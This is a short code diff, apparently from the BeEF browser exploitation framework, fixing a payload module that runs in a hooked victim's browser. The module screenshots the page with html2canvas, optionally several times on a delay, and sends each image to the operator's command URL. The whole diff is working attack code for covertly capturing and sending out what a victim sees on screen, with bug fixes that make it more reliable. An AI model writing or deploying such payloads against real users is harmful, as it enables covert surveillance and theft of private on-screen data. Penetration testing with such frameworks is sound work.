@@ -6,24 +6,27 @@
 
 beef.execute(function() {
 
-	var takes = parseInt('<%= @repeat %>') || 1;
-	var delay = parseInt('<%= @delay %>') || 0;
+	var takes = parseInt('<%= @repeat %>', 10) || 1;
+	var delay = parseInt('<%= @delay %>', 10) || 0;
 
-	snap = function(num) {
+	snap = function() {
 		try {
 			html2canvas(document.body).then(function(canvas) {
 	    		var d = canvas.toDataURL('image/png');
-	    		beef.net.send('<%= @command_url %>', <%= @command_id %> + num, 'image=' + d );
+	    		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'image=' + d );
 	    	});
+
+	    	beef.debug('html2canvas hasn\'t failed, that\'s something');
 	    }
 	    catch (e) {
-	    	beef.net.send('<%= @command_url %>', <%= @command_id %> + num, 'result=Obtaining snapshot failed: ' + e.message);
+	    	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Obtaining snapshot failed: ' + e.message);
 	    }
 	};
 
 	takeit = function() {
 		for(var i = 0; i < takes; i++) {
-			setTimeout(snap(i), delay);
+			beef.debug('Taking ' + i + '. snapshot');
+			setTimeout(snap, delay);
 		}
 	};
 
